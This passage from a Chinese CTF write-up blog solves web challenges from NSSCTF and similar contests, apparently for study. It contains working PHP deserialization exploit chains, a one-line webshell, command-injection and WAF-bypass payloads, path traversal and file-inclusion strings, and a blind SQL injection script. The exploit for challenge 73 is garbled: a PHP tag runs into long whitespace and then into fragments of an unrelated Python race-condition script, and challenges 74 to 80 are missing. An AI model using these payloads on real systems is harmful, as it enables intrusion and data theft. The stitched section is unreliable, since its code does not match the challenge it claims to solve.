class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>eval→代码执行，eval在__invoke中，就去找$a();</p>
<p>Ilovetxw里有toString里面return $bb();</p>
<p>为了触发toString，要找一个把类当字符串处理的函数，在four类里面有一个strlower($this-&gt;a)，而这一行写在<code>__set</code>方法里，所以需要调用<code>__set</code>方法，就需要用到<code>__call</code>方法，最后就会用到<code>__wakeup()</code></p>
<p>用自己的话理解就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用最终结果反推的思路，我们需要执行@eval($this-&gt;txw4ever)这一行，并且控制$this-&gt;txw4ever的值为system(&#x27;ls /&#x27;)这样的命令执行payload，这里先按下不谈，我们需要执行@eval这一条，为了执行这一条，它在__invoke()方法里面，所以需要执行__invoke()方法，__invoke()尝试以调用函数的方式调用对象才会触发，就需要寻找$a();这样的语句，在Ilovetxw类的__toString()当中存在return $bb();这一句，而$bb=$this-&gt;su，所以需要让su为NISA对象，才能通过$bb();调用__invoke()。然后需要触发其中的__toString()方法，为了触发这个__toString()方法，需要找到将类当成字符串来处理的方法，常见的有echo，本题是strlower($this-&gt;a)，这里让$this-&gt;a为对象Ilovetxw就可以了，而为了执行strlower()，这个strlower()写在类four的__set方法里，所以需要调用__set方法，需要对不存在或者不可访问的变量进行赋值，就会自动调用，Ilovetxw的__call()方法里面，$this-&gt;huang-&gt;fun=$arg[0];，可以发现，Ilovetxw里并没有成员fun，所以能触发__set，为了触发__set，__set在four类里，那么可控制$this-&gt;huang为对象four。接着需要触发__call方法，__call对不存在的方法或者不可访问的方法进行调用就自动调用，类TianXiWei的__wakeup()里面有$this-&gt;ext-&gt;nisa($this-&gt;x);而nisa()并不存在，所以要设置ext的值为类Ilovetxw的对象，通过__call来触发Ilovetxw里的__set，这个__set又能执行strlower进而触发__toString，进而触发__invoke()，最终执行里面的@eval()</span><br><span class="line">写得清晰一点就从类和方法写链子</span><br><span class="line">__invoke()-&gt;__toString()-&gt;__set()-&gt;__call()-&gt;__wakeup()</span><br><span class="line">NISA()-&gt;Ilovetxw()-&gt;four()-&gt;Ilovetxw()-&gt;TianXiWei()</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span> =<span class="string">&#x27;system(&quot;ls /&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang-&gt;a =<span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang-&gt;a-&gt;su =<span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//因为类里面有private或者protected成员，序列化后的字符串会存在特殊字符，需要通过url编码之后再传参</span></span><br><span class="line"><span class="comment">//最后考虑到waf，使用大小写进行绕过，system-&gt;System</span></span><br></pre></td></tr></table></figure>

<p>至此，想必对php的反序列化有了一个较为深刻的理解了。</p>
<h1 id="49-NISACTF-2022-midlevel"><a href="#49-NISACTF-2022-midlevel" class="headerlink" title="49.[NISACTF 2022]midlevel"></a>49.[NISACTF 2022]midlevel</h1><p>和CISCN2019华东南web11一样</p>
<h1 id="50-NSSCTF-2022-Spring-Recruit-babyphp"><a href="#50-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="50.[NSSCTF 2022 Spring Recruit]babyphp"></a>50.[NSSCTF 2022 Spring Recruit]babyphp</h1><p>使用数组来绕过intval，会报错返回1，也能绕过正则后面的就是经典md5比较</p>
<p>payload：</p>
<p><code>POST a[]=1,2&amp;b1[]=1&amp;b2[]=2&amp;c1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;c2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p>
<h1 id="51-NISACTF-2022-bingdundun"><a href="#51-NISACTF-2022-bingdundun" class="headerlink" title="51.[NISACTF 2022]bingdundun~"></a>51.[NISACTF 2022]bingdundun~</h1><p>文件上传，可以考虑phar或者zip协议，上传了zip之后</p>
<p><code>phar://xxx.zip/xxx</code>，由于xxx的内容是一句话，蚁剑连接该地址即可</p>
<h1 id="52-GDOUCTF-2023-EZ-WEB"><a href="#52-GDOUCTF-2023-EZ-WEB" class="headerlink" title="52.[GDOUCTF 2023]EZ WEB"></a>52.[GDOUCTF 2023]EZ WEB</h1><p>F12-&gt;&#x2F;src，阅读源码，postman用put方法访问&#x2F;super-secret-route-nobody-will-guess</p>
<h1 id="53-LitCTF-2023-Vim-yyds"><a href="#53-LitCTF-2023-Vim-yyds" class="headerlink" title="53.[LitCTF 2023]Vim yyds"></a>53.[LitCTF 2023]Vim yyds</h1><p>扫目录，以及积累：vim打开文件会生成临时的swp，&#x2F;.index.php.swp获取缓存，使用strings打开，获取代码逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将password进行b64编码，传入，执行任意命令</p>
<h1 id="54-GXYCTF-2019-BabyUpload"><a href="#54-GXYCTF-2019-BabyUpload" class="headerlink" title="54.[GXYCTF 2019]BabyUpload"></a>54.[GXYCTF 2019]BabyUpload</h1><p>content-type修改，上传.htaccess，过滤&lt;?，使用script绕过</p>
<p><code>&lt;script language=&#39;php&#39;&gt;assert($_REQUEST[&#39;cmd&#39;])&lt;/script&gt;</code></p>
<p>waf不允许执行system()，使用show_source()</p>
<h1 id="55-GKCTF-2020-cve版签到"><a href="#55-GKCTF-2020-cve版签到" class="headerlink" title="55.[GKCTF 2020]cve版签到"></a>55.[GKCTF 2020]cve版签到</h1><p>点击页面的连接可以回显header，php的get_headers()函数在低版本被url的\0截断就可以请求连接。浏览器通过%00截断</p>
<p><code>?url=http://127.0.0.1%00www.ctfhub.com</code></p>
<p>回显的Tips里面有host以123结尾</p>
<p><code>?url=http://127.0.0.123%00www.ctfhub.com</code></p>
<h1 id="56-HNCTF-2022-Week1-2048"><a href="#56-HNCTF-2022-Week1-2048" class="headerlink" title="56.[HNCTF 2022 Week1]2048"></a>56.[HNCTF 2022 Week1]2048</h1><p>F12找到flag的ascii</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plain = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">53</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">48</span>,<span class="number">99</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">101</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">99</span>,<span class="number">51</span>,<span class="number">102</span>,<span class="number">56</span>,<span class="number">50</span>,<span class="number">56</span>,<span class="number">98</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">97</span>,<span class="number">55</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">48</span>,<span class="number">56</span>,<span class="number">51</span>,<span class="number">125</span>]</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#flag&#123;53160c888e25c3f828b23e316a7ae083&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="57-LitCTF-2023-Http-pro-max-plus"><a href="#57-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="57.[LitCTF 2023]Http pro max plus"></a>57.[LitCTF 2023]Http pro max plus</h1><p>Client-IP:127.0.0.1</p>
<p>Referer:pornhub.com</p>
<p>User-Agent:Chrome</p>
<p>Via:Clash.win</p>
<p>然后F12查看注释的flag地址最后访问</p>
<h1 id="58-NISACTF-2022-popchains"><a href="#58-NISACTF-2022-popchains" class="headerlink" title="58.[NISACTF 2022]popchains"></a>58.[NISACTF 2022]popchains</h1><p><code>分析下链子，传入wish进行反序列化，在Try_Work_Hard类里找到include($value)函数，需要include(/flag)，这是最终目的，为此需要调用append方法，而类里面有__invoke()方法会调用append，为此需要触发invoke，为了触发invoke，需要寻找$a()，在Make_a_Change类的__get方法里return了一个$function()，$a()就找到了。为此需要触发__get，而$function的值是$this-&gt;effort，可以控制它为对象，为了触发get，需要访问不存在的属性，而Road_is_Long里的__toString里面的return $this-&gt;string-&gt;page，可以控制string为其他类对象，其他类对象里面没有page这个属性，就可以触发__get，所以要触发__toString，而Road_is_Long的__construct里面的$this-&gt;page = $file;会触发__toString，就让$this-&gt;page的值为Road_is_Long的对象就可以了。尝试写个exp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span class="keyword">string</span>-&gt;effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="59-GDOUCTF-2023-泄露的伪装"><a href="#59-GDOUCTF-2023-泄露的伪装" class="headerlink" title="59.[GDOUCTF 2023]泄露的伪装"></a>59.[GDOUCTF 2023]泄露的伪装</h1><p>扫目录，<a href="http://www.rar泄露，->orzorz.php，使用伪协议进行传参使得file_get_contents的结果为ctrl">www.rar泄露，-&gt;orzorz.php，使用伪协议进行传参使得file_get_contents的结果为ctrl</a></p>
<p>payload：<code>?cxk=data://text/plain,ctrl</code></p>
<h1 id="60-CISCN-2019华北Day2-Web1"><a href="#60-CISCN-2019华北Day2-Web1" class="headerlink" title="60.[CISCN 2019华北Day2]Web1"></a>60.[CISCN 2019华北Day2]Web1</h1><p>使用intruder配合sql injection的payload快速筛选过滤关键词，通过观察过滤关键词采取盲注手段</p>
<p>poc：<code>id=0^(ascii(substr(select(flag)from(flag)),1,1))&gt;101)</code></p>
<p>payload：<code>if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2) % (i,j)</code></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28080/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            x = <span class="built_in">chr</span>(j)</span><br><span class="line">            flag += <span class="built_in">str</span>(x)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="61-HCTF-2018-Warmup"><a href="#61-HCTF-2018-Warmup" class="headerlink" title="61.[HCTF 2018]Warmup"></a>61.[HCTF 2018]Warmup</h1><p>代码waf逻辑是通过mb_substr截取0到strpos($page.’?’,’?’)也就是两个?之间的值，并和白名单进行比较，构造</p>
<p><code>?file=source.php?../../../../../../../../../ffffllllaaaagggg</code></p>
<h1 id="62-HNCTF-2022-Week1-Interesting-include"><a href="#62-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="62.[HNCTF 2022 Week1]Interesting_include"></a>62.[HNCTF 2022 Week1]Interesting_include</h1><p>payload：<code>filter=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h1 id="63-NSSRound-1-Basic-basic-check"><a href="#63-NSSRound-1-Basic-basic-check" class="headerlink" title="63.[NSSRound#1 Basic]basic_check"></a>63.[NSSRound#1 Basic]basic_check</h1><p>curl访问靶机地址允许put方法，使用put 地址&#x2F;shell.php写入webshell</p>
<h1 id="64-SWPUCTF-2022-新生赛-ez-rce"><a href="#64-SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="64.[SWPUCTF 2022 新生赛]ez_rce"></a>64.[SWPUCTF 2022 新生赛]ez_rce</h1><p>扫目录 robots.txt发现&#x2F;NSS&#x2F;index.php，tp5框架，工具一把梭</p>
<p>flag在<code>/nss/ctf/flag/flag</code></p>
<h1 id="65-羊城杯-2020-easycon"><a href="#65-羊城杯-2020-easycon" class="headerlink" title="65.[羊城杯 2020]easycon"></a>65.[羊城杯 2020]easycon</h1><p>蚁剑直接连index.php，下载bbbbbb.txt，base64转图片</p>
<h1 id="66-LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#66-LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="66.[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>66.[LitCTF 2023]这是什么？SQL ！注一下 ！</h1><p>sqlmap一把梭</p>
<h1 id="67-鹤城杯-2021-Middle-magic"><a href="#67-鹤城杯-2021-Middle-magic" class="headerlink" title="67.[鹤城杯 2021]Middle magic"></a>67.[鹤城杯 2021]Middle magic</h1><p>%0a绕过正则，数组绕过sha1，json_encode()内容和字符串比较漏洞，<code>0 == &quot;string&quot;</code></p>
<p>payload：</p>
<p><code>?aaa=%0apass_the_level_1%23  POST:admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125;</code></p>
<h1 id="68-GDOUCTF-2023-受不了一点"><a href="#68-GDOUCTF-2023-受不了一点" class="headerlink" title="68.[GDOUCTF 2023]受不了一点"></a>68.[GDOUCTF 2023]受不了一点</h1><p>payload：<code>/?aaa=114514a&amp;bbb=114514 POST gdou[]=1&amp;ctf[]=2 Header:Cookie:cookie=j0k3r</code></p>
<h1 id="69-GKCTF-2021-easycms"><a href="#69-GKCTF-2021-easycms" class="headerlink" title="69.[GKCTF 2021]easycms"></a>69.[GKCTF 2021]easycms</h1><p>&#x2F;admin</p>
<p>admin&#x2F;12345</p>
<p>设计→自定义→导出主题→保存，会在url中得到b64文件名，修改为flag的b64值<code>L2ZsYWc=</code>任意文件下载</p>
<p>文件上传没利用成功，保存提示fail</p>
<h1 id="70-HNCTF-2022-Week1-easy-html"><a href="#70-HNCTF-2022-Week1-easy-html" class="headerlink" title="70.[HNCTF 2022 Week1]easy_html"></a>70.[HNCTF 2022 Week1]easy_html</h1><p>抓包访问&#x2F;fl4g.php，前端修改限长为11，随便输入11位数字getflag</p>
<h1 id="71-HDCTF-2023-SearchMaster"><a href="#71-HDCTF-2023-SearchMaster" class="headerlink" title="71.[HDCTF 2023]SearchMaster"></a>71.[HDCTF 2023]SearchMaster</h1><p>payload：POST<code>data=&#123;system(&#39;cat /f*&#39;)&#125;</code></p>
<h1 id="72-UUCTF-2022-新生赛-ez-rce"><a href="#72-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="72.[UUCTF 2022 新生赛]ez_rce"></a>72.[UUCTF 2022 新生赛]ez_rce</h1><p>读取文件指令还有nl</p>
<p>使用短标签，先闭合，反引号执行</p>
<p>payload1：<code>?code=?&gt;&lt;?=`l\s /`?&gt;</code></p>
<p>payload2：<code>?code=?&gt;&lt;?=`nl /fffffffffflagafag`?&gt;</code></p>
<h1 id="73-第五空间-2021-pklovecloud"><a href="#73-第五空间-2021-pklovecloud" class="headerlink" title="73.[第五空间 2021]pklovecloud"></a>73.[第五空间 2021]pklovecloud</h1><p>链子分析：<code>需要执行ace下的file_get_contents($file)，为此需要让$this-&gt;openstack-&gt;neutron===$this-&gt;openstack-&gt;nova成立，让两者都为null就行，可以控制$this-&gt;docker=null，由于cinder是protected类型，只能在内部赋值，而我们实际是可以控制__construct()方法执行什么的，源代码这里给$this-&gt;cinder赋值了没有用的pkshow对象，这里修改成我们要的ace对象从而执行它的echo_name方法，而to_String则是在源代码中的echo处触发，反序列化了pks的序列化串会得到对象，echo这个对象的时候-&gt;__toString-&gt;$this-&gt;cinder-&gt;echo_name()此时$this-&gt;cinder为ace对象，则会触发ace对象里的echo_name函数则会执行里面的代码，绕过了$this-&gt;openstack-&gt;neutron===$this-&gt;openstack-&gt;nova进入到file_get_contents(&quot;flag.php&quot;)成功读取文件</code></p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           <span class="meta">?&gt;</span><span class="string">&#x27;&#125;,</span></span><br><span class="line"><span class="string">                     files=&#123;&#x27;</span>file<span class="string">&#x27;: (file, f)&#125;, cookies=&#123;&#x27;</span>PHPSESSID<span class="string">&#x27;: sessid&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def read(session):</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        resp = session.post(</span></span><br><span class="line"><span class="string">            f&quot;&#123;target&#125;?mode=foo&amp;file=/tmp/sess_&#123;sessid&#125;&amp;cmd=system(&#x27;</span>cd /;ls;cat nssctfasdasdflag<span class="string">&#x27;);&quot;)</span></span><br><span class="line"><span class="string">        if file in resp.text:</span></span><br><span class="line"><span class="string">            print(resp.text)</span></span><br><span class="line"><span class="string">            event.clear()</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            print(&quot;[+]retry&quot;)</span></span><br><span class="line"><span class="string">            # print(resp.text)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    event = threading.Event()</span></span><br><span class="line"><span class="string">    with requests.session() as session:</span></span><br><span class="line"><span class="string">        for i in xrange(1, 30):  # 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line"><span class="string">            threading.Thread(target=write, args=(session,)).start()</span></span><br><span class="line"><span class="string">            # target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line"><span class="string">        for i in xrange(1, 30):</span></span><br><span class="line"><span class="string">            threading.Thread(target=read, args=(session,)).start()</span></span><br><span class="line"><span class="string">    event.set()</span></span><br></pre></td></tr></table></figure>

<h1 id="81-HNCTF-2022-Week1-Interesting-http"><a href="#81-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="81.[HNCTF 2022 Week1]Interesting_http"></a>81.[HNCTF 2022 Week1]Interesting_http</h1><p>数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">want=flag</span><br></pre></td></tr></table></figure>

<h1 id="82-WUSTCTF-2020-朴实无华"><a href="#82-WUSTCTF-2020-朴实无华" class="headerlink" title="82.[WUSTCTF 2020]朴实无华"></a>82.[WUSTCTF 2020]朴实无华</h1><p>&#x2F;fl4g.php</p>
<p>第一套：intval()使用不当，intval(‘1e10’)&#x3D;1;intval(‘1e10’+1)&#x3D;141065409</p>
<p>第二套：经典md5，0e绕过<code>0e215962017</code></p>
<p>第三套：过滤了空格和cat，使用${IFS}和tac</p>
<p>payload:<code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<h1 id="83-LitCTF-2023-Flag点击就送！"><a href="#83-LitCTF-2023-Flag点击就送！" class="headerlink" title="83.[LitCTF 2023]Flag点击就送！"></a>83.[LitCTF 2023]Flag点击就送！</h1><p>脑洞题，secret_key为LitCTF，flasksession伪造</p>
